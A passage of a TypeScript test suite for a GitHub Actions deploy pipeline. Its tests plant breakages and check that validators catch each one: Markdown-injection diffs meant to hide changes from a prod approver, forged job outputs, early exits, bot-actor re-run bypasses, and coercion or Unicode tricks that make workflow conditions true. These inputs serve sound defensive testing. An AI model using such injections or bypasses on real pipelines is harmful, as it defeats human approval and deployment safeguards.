        const code = step.run.split('\n').filter(line => line.trim() !== '' && !line.trimStart().startsWith('#'))
        expect(code.slice(0, 3), `${each.id} (${step.name})`).toEqual([
          'set -euo pipefail',
          ...STOP_COMMANDS.split('\n'),
        ])
        expect(step.run.startsWith(`${STOP_HEAD}\n`), `${each.id} (${step.name})`).toBe(true)
      })
    }
    // Before the credentials: the release (or a rollback job's two releases), the image's check (nonprod and
    // prod), the assembly's, the fast re-check (nonprod and prod), CLI_FETCH and CLI_CHECK: six in each deploy
    // job and four in prod-plan and each rollback job.
    expect(before).toBe(24)
    expect(after).toBe(31)
    // The token is new each run, and the line naming it is the first the run prints.
    const tokens = [0, 1].map(() => {
      const result = spawnSync('bash', ['-c', `${PREAMBLE}\necho after`], {
        encoding: 'utf8',
        env: { PATH: process.env.PATH ?? '', RUNNER_TEMP: '/nowhere' },
      })
      expect(result.status).toBe(0)
      const [first, second] = result.stdout.split('\n')
      expect(second).toBe('after')
      return /^::stop-commands::([0-9a-f]{32})$/.exec(first ?? '')?.[1]
    })
    expect(tokens[0]).toBeDefined()
    expect(tokens[0]).not.toBe(tokens[1])
    // A run that drops the two lines, or stops them only after its first command, is refused, before the
    // credentials action as after it.
    const indented = (text: string) => text.replace(/^/gm, '          ')
    for (const [id, name] of [
      ['nonprod', 'Deploy Services'],
      ['nonprod', 'Check and unpack the image'],
      ['prod', 'The pinned CDK CLI'],
      ['prod-plan', 'Check the assembly'],
      ['rollback-prod', "This run's release and the previous one"],
    ] as const) {
      const step = stepText(deployText, id, name)
      for (const changed of [
        edited(step, `${indented(STOP_COMMANDS)}\n`, ''),
        edited(step, `${indented(STOP_COMMANDS)}\n`, `          echo starting\n${indented(STOP_COMMANDS)}\n`),
      ]) {
        expect(maskingFindings(withText(DEPLOY, edited(deployText, step, changed, job(id))))).toContain(
          at(`${id} (${name})`, STOPS),
        )
      }
    }
  })
  // INPUTS-A1-01 (round 6). The approver reads prod-plan's diff in the job summary, which GitHub renders as
  // GitHub Flavored Markdown, and the diff prints a release's own text as it is (an annotation, a validation
  // report, a template's string): written inside a fenced block, a line of three backticks ended the block
  // and a line starting <!-- then hid the real diff in an HTML comment, and Markdown reads a lone carriage
  // return as a line's end too. So the run writes the diff as an indented code block, every line four spaces
  // in and every carriage return a line break first: no line of the diff can end the block or open HTML.
  // And four spaces a line can make the text five times longer, so it is cut short of a step summary's 1 MiB.
  it('writes the approver’s diff as one indented code block no line of it can end, under a summary’s 1 MiB (INPUTS-A1-01, round 6)', () => {
    const scratch = mkdtempSync(join(tmpdir(), 'hearth-dpw07-diff-'))
    // The pinned Diff run, with a stand-in CLI that prints the given bytes as its diff.
    const summary = (diff: Buffer) => {
      const temp = mkdtempSync(join(scratch, 'runner-'))
      execFileSync('mkdir', ['-p', join(temp, 'aws-cdk', 'package', 'bin')])
      writeFileSync(join(temp, 'printed'), diff)
      writeFileSync(join(temp, 'aws-cdk', 'package', 'bin', 'cdk'), `#!/bin/sh\ncat '${join(temp, 'printed')}'\n`, {
        mode: 0o755,
      })
      writeFileSync(join(temp, 'summary.md'), '')
      const result = spawnSync('bash', ['-c', DIFF_RUN], {
        encoding: 'utf8',
        env: {
          PATH: process.env.PATH ?? '',
          HOME: temp,
          RUNNER_TEMP: temp,
          GITHUB_STEP_SUMMARY: join(temp, 'summary.md'),
          STAGE: 'prod',
          MODE: 'deploy',
        },
      })
      expect(result.status).toBe(0)
      return readFileSync(join(temp, 'summary.md'), 'utf8')
    }
    try {
      const diff = [
        'Stack prod/Services (Hearth-prod-Services)',
        '```',
        '<!-- everything after this is hidden',
        '',
        'a line\r```\r<!--\rafter a carriage return',
        '\t<details>',
        '[~] AWS::ECS::TaskDefinition Services/ApiTask replace',
      ].join('\n')
      const lines = summary(Buffer.from(`${diff}\n`)).split('\n')
      expect(lines.slice(0, 2)).toEqual(["### What prod's deploy changes", ''])
      // Every line of the diff is four spaces in, a carriage return made a line break; then blank lines.
      expect(lines.slice(2, 13)).toEqual([
        '    Stack prod/Services (Hearth-prod-Services)',
        '    ```',
        '    <!-- everything after this is hidden',
        '    ',
        '    a line',
        '    ```',
        '    <!--',
        '    after a carriage return',
        '    \t<details>',
        '    [~] AWS::ECS::TaskDefinition Services/ApiTask replace',
        '',
      ])
      expect(lines.slice(13).every(line => line === '')).toBe(true)
      expect(lines.join('\n')).not.toContain('\r')
      // A diff of line breaks alone, each made five bytes, stays under a step summary's 1 MiB, and says it is cut.
      expect(DIFF_CUT).toBe(204800)
      const cut = summary(Buffer.alloc(3 * DIFF_CUT, '\n'))
      expect(Buffer.byteLength(cut)).toBeLessThan(1024 * 1024)
      expect(cut).toContain("The diff is cut at 200 KB here; the job's log holds it whole.")
      expect(
        cut
          .split('\n')
          .slice(2, 2 + DIFF_CUT)
          .every(line => line === '    '),
      ).toBe(true)
    } finally {
      rmSync(scratch, { recursive: true, force: true })
    }
  })
})

describe('DPW-08 (C11-D52): the way to prod', () => {
  const at = (id: string, rule: string) => `${DEPLOY}: DPW-08 ${id}: ${rule}`
  const RECHECK =
    "the fast re-check comes before the credentials and checks a deploy's ancestry (and in prod both digests) and any other mode's record id"
  const SAME_STEPS = "its steps are rollback-nonprod's but for the environment's name"

  it('finds each planted breakage', () => {
    expect(
      prodPathFindings(
        plant(
          '    needs: [gate, build, synth, nonprod, prod-plan, prod-gate]\n',
          '    needs: [gate, build, synth, nonprod, prod-plan]\n',
          job('prod'),
        ),
      ),
    ).toEqual([at('prod', 'needs prod-gate and prod-plan')])
    expect(
      prodPathFindings(
        plant('    cache-mode: none\n', '    cache-mode: none\n    environment: prod\n', job('prod-gate')),
      ),
    ).toEqual([
      at('prod-gate', 'names no environment and holds no id-token'),
      at('prod-gate', 'deploys nothing to prod: only prod and rollback-prod do'),
    ])
    const elif = [
      `          elif [ "$(jq -r '.id // ""' <<<"$newest")" != "$RECORD_ID" ]; then`,
      `            echo "fast re-check: nonprod's release records changed since the gate read them"`,
      '            exit 1',
      '',
    ].join('\n')
    expect(prodPathFindings(plant(elif, '', job('nonprod')))).toEqual([at('nonprod', RECHECK)])
    const recordCheck = [
      `          if [ "$(jq -r '.id // ""' <<<"$newest")" != "$RECORD_ID" ]; then`,
      `            echo "fast re-check: prod's release records changed since prod-gate read them"`,
      '            exit 1',
      '          fi',
      '',
    ].join('\n')
    expect(prodPathFindings(plant(recordCheck, '', job('prod')))).toEqual([at('prod', RECHECK)])
    expect(prodPathFindings(movedStep('prod', 'The fast re-check', 'What runs'))).toEqual([at('prod', RECHECK)])
    expect(
      prodPathFindings(
        plant(
          "(needs.gate.outputs.mode == 'deploy' && needs.smoke-nonprod.result == 'success') || needs.gate.outputs.mode == 'rollback'",
          "needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'rollback'",
          job('prod-plan'),
        ),
      ),
    ).toEqual([at('prod-plan', "its if: requires smoke-nonprod's success for a deploy")])
    expect(prodPathFindings(copiedStep('prod', 'Take the restore stage down', 'rollback-prod', 'Probe'))).toEqual([
      at('rollback-prod', SAME_STEPS),
      at('rollback-prod', "deploys only the previous release's Tasks and Services"),
    ])
    expect(
      prodPathFindings(
        plant(
          '"repos/$REPO/actions/runs/$RUN_ID/jobs?per_page=100"',
          '"repos/$REPO/commits/$SHA/check-runs?per_page=100"',
          job('prod-gate'),
        ),
      ),
    ).toEqual([
      at(
        'prod-gate',
        "waits for main's check and migrations for a deploy alone, read from ci.yml's own run and its jobs",
      ),
      at('prod-gate', 'reads no check run, check suite or commit status'),
      at("prod-gate (main's own CI)", PINNED_08),
    ])
    expect(
      prodPathFindings(
        plant(
          '    needs: [gate, build, synth, nonprod, smoke-nonprod]\n',
          '    needs: [gate, synth, nonprod, smoke-nonprod]\n',
          job('rollback-nonprod'),
        ),
      ),
    ).toEqual([
      at(
        'rollback-nonprod',
        "needs build, takes this run's digest from build for a deploy and from the gate for a drill-smoke, and runs only once nonprod set services_started",
      ),
    ])
    expect(
      prodPathFindings(plant(" && needs.prod.outputs.services_started == 'true'", '', job('rollback-prod'))),
    ).toEqual([
      at(
        'rollback-prod',
        "needs build, takes this run's digest from build for a deploy and from the gate for a drill-smoke, and runs only once prod set services_started",
      ),
    ])
    expect(
      prodPathFindings(plant('      - name: Rolled back\n', '      - name: Rolled back, prod\n', job('rollback-prod'))),
    ).toEqual([at('rollback-prod (Rolled back)', PINNED_08), at('rollback-prod', SAME_STEPS)])
    // Each run the gates rest on is pinned whole: an early exit 0 or a forged output is found.
    const WAIT = "waits for main's check and migrations for a deploy alone, read from ci.yml's own run and its jobs"
    expect(
      prodPathFindings(addedBefore('prod-gate', "main's own CI", '          DEADLINE=', '          exit 0\n')),
    ).toEqual([at('prod-gate', WAIT), at("prod-gate (main's own CI)", PINNED_08)])
    expect(
      prodPathFindings(
        addedBefore(
          'prod-gate',
          'The prod gate',
          '          if ! OUT=$(node',
          '          echo current_prod_id= >>"$GITHUB_OUTPUT"; exit 0\n',
        ),
      ),
    ).toEqual([
      at('prod-gate', 'runs history.ts prod-gate with the mode'),
      at('prod-gate (The prod gate)', PINNED_08),
      at('prod-gate (The prod gate)', OUTPUT_PINNED),
    ])
    expect(
      prodPathFindings(
        addedBefore('prod', 'The fast re-check', '          newest=$(newest_release prod)\n', '          exit 0\n'),
      ),
    ).toEqual([at('prod', RECHECK)])
    expect(
      prodPathFindings(
        addedBefore(
          'nonprod',
          'The fast re-check',
          '          newest=$(newest_release nonprod)\n',
          '          exit 0\n',
        ),
      ),
    ).toEqual([at('nonprod', RECHECK)])
    expect(
      prodPathFindings(
        addedBefore(
          'gate',
          'The pull request that made this commit, and its checks',
          '          PULLS=',
          `          jq -n '{pull: 1, check: "success", migrations: "success"}' >"$RUNNER_TEMP/checks.json"; exit 0\n`,
        ),
      ),
    ).toEqual([
      at('gate', "reads its pull request's check and migrations from ci.yml's own run on its head and that run's jobs"),
      at('gate (The pull request that made this commit, and its checks)', PINNED_08),
    ])
    // SECURITY-01: a run chosen without its head repository and branch could be another fork's.
    expect(
      prodPathFindings(
        plant(
          ' and ($pull.head.repo.id | type == "number") and .head_repository.id == $pull.head.repo.id and .head_branch == $pull.head.ref',
          '',
          job('gate'),
        ),
      ),
    ).toEqual([
      at('gate', "reads its pull request's check and migrations from ci.yml's own run on its head and that run's jobs"),
      at('gate (The pull request that made this commit, and its checks)', PINNED_08),
    ])
  })

  // ACTIONS-01: a smoke re-run on its own keeps its job's outputs from an earlier attempt, so it would judge
  // a read-back of what ran then: each smoke refuses one from another attempt.
  it('finds a smoke that could judge a read-back from another attempt', () => {
    const stale = (smoke: string, source: string) =>
      at(
        smoke,
        `judges only the read-back ${source} wrote in this attempt: ${source} outputs attempt, and the smoke refuses first unless it is GITHUB_RUN_ATTEMPT`,
      )
    const output = `      attempt: \${{ github.run_attempt }}\n`
    expect(prodPathFindings(plant(output, '', job('nonprod')))).toEqual([stale('smoke-nonprod', 'nonprod')])
    expect(prodPathFindings(plant(output, '', job('rollback-prod')))).toEqual([stale('resmoke-prod', 'rollback-prod')])
    expect(
      prodPathFindings(
        plant(
          `          ATTEMPT: \${{ needs.prod.outputs.attempt }}\n`,
          `          ATTEMPT: \${{ github.run_attempt }}\n`,
          job('smoke-prod'),
        ),
      ),
    ).toEqual([stale('smoke-prod', 'prod')])
    const check = `${indent(SMOKE_ATTEMPT, 10)}\n`
    expect(prodPathFindings(plant(check, '', job('resmoke-nonprod')))).toEqual([
      stale('resmoke-nonprod', 'rollback-nonprod'),
      at('resmoke-nonprod (Smoke)', PINNED_08),
    ])
    // The check after smoke.ts has judged, or in a step of its own beside it, comes too late.
    const smokeLine = '          node infra/scripts/deploy/smoke.ts '
    const moved = edited(
      edited(deployText, check, '', job('smoke-nonprod')),
      smokeLine,
      `${check}${smokeLine}`,
      job('smoke-nonprod'),
    )
    expect(prodPathFindings(withText(DEPLOY, moved))).toEqual([
      stale('smoke-nonprod', 'nonprod'),
      at('smoke-nonprod (Smoke)', PINNED_08),
    ])
    expect(prodPathFindings(copiedStep('smoke-prod', 'Smoke', 'smoke-prod', 'Smoke'))).toEqual([
      stale('smoke-prod', 'prod'),
      at('smoke-prod (Smoke)', PINNED_08),
    ])
  })

  // Round 2's ACTIONS-03: a re-run of prod alone (or of the failed jobs) keeps prod-plan's outputs, and so its
  // diff, from an earlier attempt, while what prod runs may have changed since; prod's fast re-check holds
  // the approval to prod-plan's attempt and to the record prod-gate read, in every mode.
  it('finds a prod approval not held to prod-plan’s diff of this attempt', () => {
    const PLAN = "outputs its attempt alone, which prod's fast re-check holds to its own"
    const attempt = `      attempt: \${{ github.run_attempt }}\n`
    expect(prodPathFindings(plant(`    outputs:\n${attempt}`, '', job('prod-plan')))).toEqual([at('prod-plan', PLAN)])
    expect(prodPathFindings(plant(attempt, `      attempt: \${{ github.run_id }}\n`, job('prod-plan')))).toEqual([
      at('prod-plan', PLAN),
    ])
    expect(prodPathFindings(plant(attempt, `${attempt}      diff: \${{ github.run_id }}\n`, job('prod-plan')))).toEqual(
      [at('prod-plan', PLAN)],
    )
    expect(
      prodPathFindings(plant(`          PLAN_ATTEMPT: \${{ needs.prod-plan.outputs.attempt }}\n`, '', job('prod'))),
    ).toEqual([at('prod', RECHECK)])
    expect(
      prodPathFindings(
        plant(
          '          if [ "$TARGET" = prod ] && [ "$PLAN_ATTEMPT" != "$GITHUB_RUN_ATTEMPT" ]; then\n',
          '          if false; then\n',
          job('prod'),
        ),
      ),
    ).toEqual([at('prod', RECHECK)])
  })

  // The same, run with bash: prod's fast re-check from deploy.yml against a stand-in gh and a real git.
  it('refuses a prod approval from another attempt, and a record that moved since prod-gate, in every mode', () => {
    const prod = workflowJobs(deployText).find(each => each.id === 'prod')
    const run = (prod === undefined ? [] : parsedSteps(prod)).find(step => step.name === 'The fast re-check')?.run
    expect(run).toBeDefined()
    const repo = mkdtempSync(join(tmpdir(), 'hearth-dpw08-'))
    try {
      const git = (args: readonly string[]) =>
        execFileSync(
          'git',
          [
            '-c',
            'user.name=hearth-test',
            '-c',
            `user.email=${['test', 'example.invalid'].join('@')}`,
            '-c',
            'commit.gpgsign=false',
            '-c',
            'tag.gpgSign=false',
            '-c',
            'core.hooksPath=/dev/null',
            ...args,
          ],
          { cwd: repo, encoding: 'utf8', stdio: ['ignore', 'pipe', 'pipe'] },
        ).trim()
      git(['init', '-q', '-b', 'main'])
      git(['commit', '-q', '--allow-empty', '-m', 'A'])
      const older = git(['rev-parse', 'HEAD'])
      git(['commit', '-q', '--allow-empty', '-m', 'B'])
      const head = git(['rev-parse', 'HEAD'])
      const record = (id: number) => ({
        id,
        task: 'hearth-release',
        environment: 'prod',
        payload: {
          schema: 1,
          kind: 'deploy',
          commit: older,
          digest: `sha256:${'1'.repeat(64)}`,
          migratedCommit: null,
          services: { api: 'hearth-prod-api:3', realtime: 'hearth-prod-realtime:3', worker: 'hearth-prod-worker:3' },
        },
      })
      const digest = `sha256:${'2'.repeat(64)}`
      const recheck = (env: Record<string, string>) =>
        spawnSync('bash', ['-c', `gh() { printf '%s\\n' "$RECORDS"; }\n${run ?? ''}`], {
          cwd: repo,
          encoding: 'utf8',
          env: {
            PATH: process.env.PATH ?? '',
            HOME: repo,
            GITHUB_SHA: head,
            GITHUB_RUN_ATTEMPT: '2',
            REPO: 'example/hearth',
            MODE: 'deploy',
            TARGET: 'prod',
            RECORD_ID: '7',
            PLAN_ATTEMPT: '2',
            BUILD_DIGEST: digest,
            NONPROD_DIGEST: digest,
            RECORDS: JSON.stringify([record(7)]),
            ...env,
          },
        })
      const said = (env: Record<string, string>) => {
        const result = recheck(env)
        return { status: result.status, said: result.stdout.trim().split('\n').at(-1) ?? '' }
      }
      expect(said({}).status).toBe(0)
      expect(said({ MODE: 'rollback' }).status).toBe(0)
      const stale = {
        status: 1,
        said: "fast re-check: prod-plan's diff is from another attempt of this run: re-run prod-plan, which re-runs prod-gate and this job after it, or dispatch afresh",
      }
      expect(said({ PLAN_ATTEMPT: '1' })).toEqual(stale)
      expect(said({ PLAN_ATTEMPT: '' })).toEqual(stale)
      expect(said({ MODE: 'rollback', PLAN_ATTEMPT: '1' })).toEqual(stale)
      // A restore has no prod-plan, so its attempt isn't read; its record still is.
      expect(said({ TARGET: 'restore', PLAN_ATTEMPT: '' }).status).toBe(0)
      const moved = { status: 1, said: "fast re-check: prod's release records changed since prod-gate read them" }
      // A deploy too: a rollback recorded after prod-gate read the records, though its commit is an ancestor.
      expect(
        said({
          RECORDS: JSON.stringify([record(7), { ...record(8), payload: { ...record(8).payload, kind: 'rollback' } }]),
        }),
      ).toEqual(moved)
      expect(said({ TARGET: 'restore', PLAN_ATTEMPT: '', RECORD_ID: '6' })).toEqual(moved)
      // A first deploy: no record then, and none now.
      expect(said({ RECORDS: '[]', RECORD_ID: '' }).status).toBe(0)
    } finally {
      rmSync(repo, { recursive: true, force: true })
    }
  })

  // Round 3's SCRIPTS-03: the fast re-checks' reader, run with bash and jq, ignores what history.ts ignores, a
  // value that ends in a newline among them (jq's $ matches before a final newline, JavaScript's doesn't),
  // and names the same newest record.
  it('reads the newest release record as history.ts does, ignoring a value that ends in a newline', () => {
    const commit = 'a'.repeat(40)
    const services = (revision: string) => ({
      api: `hearth-prod-api:${revision}`,
      realtime: 'hearth-prod-realtime:3',
      worker: 'hearth-prod-worker:3',
    })
    const record = (id: number, payload: Record<string, unknown> = {}) => ({
      id,
      task: 'hearth-release',
      environment: 'prod',
      payload: {
        schema: 1,
        kind: 'deploy',
        commit,
        digest: `sha256:${'1'.repeat(64)}`,
        migratedCommit: null,
        services: services('3'),
        ...payload,
      },
    })
    const records = [
      record(202),
      record(303, { commit: `${commit}\n`, services: services('9') }),
      record(304, { digest: `sha256:${'1'.repeat(64)}\n`, services: services('9') }),
      record(305, { migratedCommit: `${commit}\n`, services: services('9') }),
      record(306, { services: services('9\n') }),
      record(307, { services: { ...services('9'), worker: 'hearth-prod-worker:9\n' } }),
    ]
    const result = spawnSync(
      'bash',
      ['-c', `set -euo pipefail\ngh() { printf '%s\\n' "$RECORDS"; }\n${NEWEST_RELEASE}\nnewest_release prod`],
      {
        encoding: 'utf8',
        env: { PATH: process.env.PATH ?? '', REPO: 'example/hearth', RECORDS: JSON.stringify(records) },
      },
    )
    const parsed = parseReleaseRecords(records, 'prod')
    expect(parsed.records.map(each => each.id)).toEqual([202])
    expect(parsed.ignored).toEqual([303, 304, 305, 306, 307])
    expect({ status: result.status, newest: JSON.parse(result.stdout) }).toEqual({
      status: 0,
      newest: { id: 202, commit, revision: 3 },
    })
    expect(result.stderr.trim().split('\n')).toEqual(
      parsed.ignored.map(
        id => `fast re-check: ignored hearth-release record ${id} in prod: its payload fails validation`,
      ),
    )
  })

  // ROLLBACK-02: each deploy job outputs what its AWS_CHECK found running, for its rollback job's auto check.
  it('finds a deploy job that doesn’t output what it replaced', () => {
    const replaced = `      replaced: \${{ steps.aws.outputs.replaced }}\n`
    expect(prodPathFindings(plant(replaced, '', job('nonprod')))).toEqual([
      at('nonprod', "outputs replaced from its AWS_CHECK step, for rollback-nonprod's auto check"),
    ])
    expect(
      prodPathFindings(plant(replaced, `      replaced: \${{ steps.release.outputs.release }}\n`, job('prod'))),
    ).toEqual([at('prod', "outputs replaced from its AWS_CHECK step, for rollback-prod's auto check")])
  })

  it('holds the repository', () => {
    expect(prodPathFindings(workflows)).toEqual([])
  })

  // SECURITY-01: the gate's choice among ci.yml's runs on the pull request's head, run with bash and jq.
  it('chooses the pull request’s own run, never another fork’s newer one at the same commit', () => {
    const line = PULL_CHECKS.split('\n').find(each => each.startsWith('RUN_ID=')) ?? ''
    expect(line).not.toBe('')
    const head = 'a'.repeat(40)
    const run = (id: number, repo: number | null, branch: string, sha = head, path = '.github/workflows/ci.yml') => ({
      id,
      path,
      head_sha: sha,
      head_branch: branch,
      head_repository: repo === null ? null : { id: repo },
    })
    const choose = (pull: unknown, runs: unknown[]) =>
      execFileSync('bash', ['-c', `set -euo pipefail\n${line}\nprintf '%s' "$RUN_ID"`], {
        encoding: 'utf8',
        env: {
          PATH: process.env.PATH ?? '',
          HEAD: head,
          PULL: JSON.stringify(pull),
          RUNS: JSON.stringify({ workflow_runs: runs }),
        },
      })
    const own = { number: 7, head: { sha: head, ref: 'feature', repo: { id: 11 } } }
    const runs = [
      run(100, 11, 'feature'),
      run(105, 99, 'feature'),
      run(106, 11, 'another'),
      run(107, 11, 'feature', 'b'.repeat(40)),
      run(108, 11, 'feature', head, '.github/workflows/other.yml'),
    ]
    expect(choose(own, runs)).toBe('100')
    expect(choose(own, [...runs, run(101, 11, 'feature')])).toBe('101')
    // A merged pull request whose head repository is gone matches no run, so its checks read as missing.
    expect(choose({ ...own, head: { ...own.head, repo: null } }, [...runs, run(109, null, 'feature')])).toBe('')
  })
})

describe('DPW-09 (C11-D49, C11-D56, C11-D59, C11-D69): the gate, the bot test and the environments', () => {
  const at = (id: string, rule: string) => `${DEPLOY}: DPW-09 ${id}: ${rule}`
  const BOT = 'its if: starts with the bot test on github.triggering_actor and github.actor, and no bot passes it'
  const holds = PROFILES.nonprod.holdsRealData
  const gate = (
    planted: ReadonlyMap<string, string>,
    envs = environments,
    real = holds,
    script = protectEnvironments,
  ) => gateFindings(planted, envs, real, script, AGENT_MARKERS)
  const envFile = (name: string, change: (record: Record<string, unknown>) => void) => {
    const path = `.github/environments/${name}`
    const record = JSON.parse(environments.get(path) ?? '{}') as Record<string, unknown>
    change(record)
    return new Map([...environments, [path, JSON.stringify(record)]])
  }

  it('finds each planted breakage in the workflow', () => {
    const bot = `\${{ ${BOT_TEST} && `
    expect(gate(plant(bot, `\${{ `, job('nonprod')))).toEqual([at('nonprod', BOT)])
    expect(gate(plant(bot, `\${{ `, job('record-nonprod')))).toEqual([at('record-nonprod', BOT)])
    expect(
      gate(
        plant(
          "needs.gate.outputs.mode != 'drill-break' }}",
          "needs.gate.outputs.mode != 'drill-break' || always() }}",
          job('record-nonprod'),
        ),
      ),
    ).toEqual([at('record-nonprod', BOT)])
    // Round 4's GUARDS-03: an if: that a person's re-run of a bot's run passes (a re-run keeps github.actor,
    // the bot, while github.triggering_actor is the person), read with the bot as github.actor alone.
    const actorOnly = "|| !endsWith(github.triggering_actor, '[bot]') && endsWith(github.actor, '[bot]') }}"
    expect(
      gate(
        plant(
          "needs.gate.outputs.mode != 'drill-break' }}",
          `needs.gate.outputs.mode != 'drill-break' ${actorOnly}`,
          job('record-nonprod'),
        ),
      ),
    ).toEqual([at('record-nonprod', BOT)])
    expect(
      gate(
        plant(
          "needs.rollback-nonprod.outputs.rolled == 'true' }}",
          `needs.rollback-nonprod.outputs.rolled == 'true' ${actorOnly}`,
          job('resmoke-nonprod'),
        ),
      ),
    ).toEqual([at('resmoke-nonprod', BOT)])
    expect(
      gate(
        plant(
          "(needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'rollback') && ((needs.gate.outputs.target == 'prod'",
          "needs.gate.outputs.mode != 'rollback' && ((needs.gate.outputs.target == 'prod'",
          job('prod-gate'),
        ),
      ),
    ).toEqual([at('prod-gate', 'its if: admits no drill: drills are non-prod’s alone')])
    expect(gate(removedStep('gate', 'The environments are live as written'))).toEqual([
      at('gate', 'runs scripts/protect-environments.sh check before it plans'),
      at('gate (The environments are live as written)', PINNED_09),
    ])
    // An if: that skips the check on a push lets every push plan with no comparison of the live environments.
    for (const condition of ["github.event_name == 'workflow_dispatch'", 'false']) {
      expect(
        gate(
          plant(
            '      - name: The environments are live as written\n',
            `      - name: The environments are live as written\n        if: \${{ ${condition} }}\n`,
            job('gate'),
          ),
        ),
        condition,
      ).toEqual([at('gate (The environments are live as written)', PINNED_09)])
    }
    expect(gate(plant('--release "$RELEASE" --restore', '--release "" --restore', job('gate')))).toEqual([
      at('gate', 'plans through history.ts plan, every input and actor through env:'),
      at('gate (Plan)', PINNED_09),
    ])
    // An if: with !cancelled() isn't joined to success(): prod after a failed prod-gate, nonprod after a
    // failed synth, prod-gate after a failed prod-plan.
    expect(gate(plant(" && needs.prod-gate.result == 'success'", '', job('prod')))).toEqual([
      at('prod', 'its if: runs it only once synth and prod-gate succeeded'),
    ])
    expect(gate(plant(" && needs.synth.result == 'success'", '', job('nonprod')))).toEqual([
      at('nonprod', 'its if: runs it only once synth succeeded'),
    ])
    expect(gate(plant(" && needs.prod-plan.result == 'success')", ')', job('prod-gate')))).toEqual([
      at('prod-gate', 'its if: runs it only once gate and prod-plan succeeded'),
    ])
    // GUARDS-02: a term GitHub reads as true by its coercion or its precedence lets a bot, a drill and a failed
    // prod-gate through.
    const prodIf = "&& (needs.gate.outputs.mode == 'deploy' || needs.gate.outputs.mode == 'rollback') }}\n"
    for (const term of [
      'null == 0',
      "'0' == false",
      "!'0' == '0'",
      // Round 2's GUARDS-03: an operand whose value isn't known, and a comparison GitHub upper-cases.
      "(github.run_id || 'a') != true",
      "'\u212A' != 'k'",
      "'ſ' == 's'",
    ]) {
      expect(gate(plant(prodIf, prodIf.replace(' }}', ` || ${term} }}`), job('prod'))), term).toEqual([
        at('prod', BOT),
        at('prod', 'its if: admits no drill: drills are non-prod’s alone'),
        at('prod', 'its if: runs it only once synth and prod-gate succeeded'),
      ])
    }
  })

  it('finds each planted breakage in the environment files and the script', () => {
    const dir = '.github/environments'
    expect(
      gate(
        workflows,
        envFile('prod.json', record => (record.required_reviewers = 0)),
      ),
    ).toEqual([`${dir}/prod.json: DPW-09 asks for at least one reviewer`])
    // Admin bypass in any environment, non-prod's included once it holds real data and asks for its
    // reviewer (ENVS-01, round 5).
    const bypass = (name: string) => `${dir}/${name}: DPW-09 lets no admin bypass its rules`
    for (const name of ['prod.json', 'prod-plan.json', 'nonprod.json']) {
      expect(
        gate(
          workflows,
          envFile(name, record => (record.can_admins_bypass = true)),
        ),
        name,
      ).toEqual([bypass(name)])
    }
    expect(
      gate(
        workflows,
        envFile('nonprod.json', record => {
          record.required_reviewers = 1
          record.can_admins_bypass = true
        }),
        true,
      ),
    ).toEqual([bypass('nonprod.json')])
    expect(
      gate(
        workflows,
        envFile('prod-plan.json', record => (record.required_reviewers = 1)),
      ),
    ).toEqual([`${dir}/prod-plan.json: DPW-09 asks for no reviewer`])
    const nonprodReviewer = `${dir}/nonprod.json: DPW-09 asks for a reviewer exactly when PROFILES.nonprod.holdsRealData is true`
    expect(
      gate(
        workflows,
        envFile('nonprod.json', record => (record.required_reviewers = 1)),
        false,
      ),
    ).toEqual([nonprodReviewer])
    expect(gate(workflows, environments, true)).toEqual([nonprodReviewer])
    expect(
      gate(
        workflows,
        envFile('nonprod.json', record => (record.required_reviewers = 1)),
        true,
      ),
    ).toEqual([])
    expect(
      gate(workflows, new Map([...environments, [`${dir}/restore.json`, environments.get(`${dir}/prod.json`) ?? '']])),
    ).toEqual([`${dir}: DPW-09 holds exactly nonprod.json, prod-plan.json and prod.json`])
    expect(
      gate(
        workflows,
        envFile('prod.json', record => (record.wait_timer = 30)),
      ),
    ).toEqual([
      `${dir}/prod.json: DPW-09 is an environment file: its name, required_reviewers, prevent_self_review, wait_timer 0, can_admins_bypass, the custom branch policy and main alone`,
    ])
    expect(gate(workflows, environments, holds, protectEnvironments.replace('AI_AGENT CI', 'CI'))).toEqual([
      "scripts/protect-environments.sh: DPW-09 its agent markers are the Owner bootstrap script's AGENT_MARKERS",
    ])
    // The refusal comes first and reads the declared list alone: a second assignment, an unset, a narrowed
    // condition or a line run before it each make a finding.
    const refuses = [
      'scripts/protect-environments.sh: DPW-09 refuses every command but check under each agent marker, before anything else runs (MARKER_REFUSAL)',
    ]
    const plants: [string, string][] = [
      ["CLAIM_KEYS='", "AGENT_MARKERS=()\nCLAIM_KEYS='"],
      ['apply() {\n', 'apply() {\n  unset AGENT_MARKERS\n'],
      [`if [ "\${1:-}" != check ]; then`, `if [ "\${1:-}" != check ] && [ "\${1:-}" != apply ]; then`],
      ["CLAIM_KEYS='", "gh auth status\nCLAIM_KEYS='"],
      ['    if [[ -v $marker ]]; then', '    if [[ -v marker ]]; then'],
    ]
    for (const [from, to] of plants) {
      expect(protectEnvironments.includes(from)).toBe(true)
      expect(gate(workflows, environments, holds, protectEnvironments.replace(from, to))).toEqual(refuses)
    }
  })

  it('holds the repository', () => {
    expect(gate(workflows)).toEqual([])
  })

  // The gate's refusals are history.ts plan's: driven here on planted inputs, in a scratch repository
  // whose main holds m0 to m2 and a branch commit off m0 that main never merged.
  describe('history.ts plan refuses what the gate must', () => {
    let repo = ''
    const m: string[] = []
    let side = ''
    const email = ['test', 'example.invalid'].join('@')
    const git = (args: readonly string[]) =>
      execFileSync(
        'git',
        [
          ...['-c', 'user.name=hearth-test', '-c', `user.email=${email}`, '-c', 'commit.gpgsign=false'],
          ...['-c', 'tag.gpgSign=false', '-c', 'core.hooksPath=/dev/null', ...args],
        ],
        {
          cwd: repo,
          encoding: 'utf8',
          stdio: ['ignore', 'pipe', 'pipe'],
        },
      ).trim()
    const commit = (name: string) => {
      writeFileSync(join(repo, name), `${name}\n`)
      git(['add', '-A'])
      git(['commit', '-q', '-m', name])
      return git(['rev-parse', 'HEAD'])
    }
    beforeAll(() => {
      repo = mkdtempSync(join(tmpdir(), 'hearth-dpw09-'))
      git(['init', '-q', '-b', 'main'])
      m.push(commit('m0'))
      git(['checkout', '-q', '-b', 'side'])
      side = commit('side')
      git(['checkout', '-q', 'main'])
      m.push(commit('m1'), commit('m2'))
    })
    afterAll(() => {
      if (repo !== '') rmSync(repo, { recursive: true, force: true })
    })
    const digest = `sha256:${'d'.repeat(64)}`
    const record = (env: 'nonprod' | 'prod', id: number, sha: string) =>
      parseReleaseRecords(
        [
          {
            id,
            task: 'hearth-release',
            environment: env,
            payload: {
              schema: 1,
              kind: 'deploy',
              commit: sha,
              digest,
